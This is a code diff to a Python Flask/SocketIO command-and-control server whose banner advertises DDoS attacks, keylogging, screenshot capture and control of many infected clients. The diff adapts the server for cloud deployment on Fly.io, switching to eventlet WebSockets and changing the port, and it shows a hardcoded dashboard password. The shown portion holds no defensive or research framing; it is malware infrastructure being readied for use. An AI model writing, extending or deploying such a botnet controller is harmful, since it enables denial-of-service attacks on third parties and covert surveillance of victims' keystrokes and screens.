@@ -2,6 +2,7 @@
 """
 C2 SERVER - Advanced Version with All Features
 Features: DDoS Monitoring, Keylogger, Screenshots, Keep-Alive
+Fly.io compatible version
 """
 
 from flask import Flask, request, jsonify, send_file
@@ -27,8 +28,21 @@ os.makedirs('uploads', exist_ok=True)
 os.makedirs('downloads', exist_ok=True)
 os.makedirs('screenshots', exist_ok=True)
 
-# SocketIO with threading
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+# SocketIO with eventlet for production
+try:
+    import eventlet
+    eventlet.monkey_patch()
+    socketio = SocketIO(app, 
+                       cors_allowed_origins="*", 
+                       async_mode='eventlet',
+                       ping_timeout=60,
+                       ping_interval=25)
+    print("[*] Using eventlet for WebSocket support")
+except ImportError:
+    socketio = SocketIO(app, 
+                       cors_allowed_origins="*",
+                       async_mode='threading')
+    print("[*] Using threading mode (install eventlet for better performance)")
 
 # In-memory storage
 clients = {}  # {client_id: {info}}
@@ -39,13 +53,14 @@ authenticated_sessions = {}  # {session_id: expiry}
 console_sockets = []  # List of console socket IDs
 attack_stats = defaultdict(lambda: {'clients': {}, 'total_packets': 0, 'start_time': time.time(), 'target': ''})
 
-# Dashboard password
+# Dashboard password (CHANGE THIS IN PRODUCTION!)
 DASHBOARD_PASSWORD = "C2RICARDO"
 
 print("""
 ╔══════════════════════════════════════════════════════════════╗
 ║               ADVANCED C2 SERVER v3.0                        ║
 ║   DDoS • Keylogger • Screenshots • Multi-Client             ║
+║                 FLY.IO COMPATIBLE                           ║
 ╚══════════════════════════════════════════════════════════════╝
 """)
 
@@ -775,10 +790,10 @@ def cleanup_thread():
 # Start cleanup thread
 threading.Thread(target=cleanup_thread, daemon=True).start()
 
-# ============= MAIN =============
+# ============= FLY.IO COMPATIBLE MAIN =============
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
+    port = int(os.environ.get('PORT', 8080))
     
     print(f"[*] Starting Advanced C2 Server on port {port}")
     print(f"[*] Dashboard: http://0.0.0.0:{port}")
@@ -786,4 +801,11 @@ if __name__ == '__main__':
     print(f"[*] Features: DDoS, Keylogger, Screenshots, Keep-Alive")
     print()
     
-    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
+    # For Fly.io deployment with WebSocket support
+    # IMPORTANT: Run with: python server.py
+    socketio.run(app, 
+                host='0.0.0.0', 
+                port=port, 
+                debug=False, 
+                allow_unsafe_werkzeug=True,
+                log_output=True)
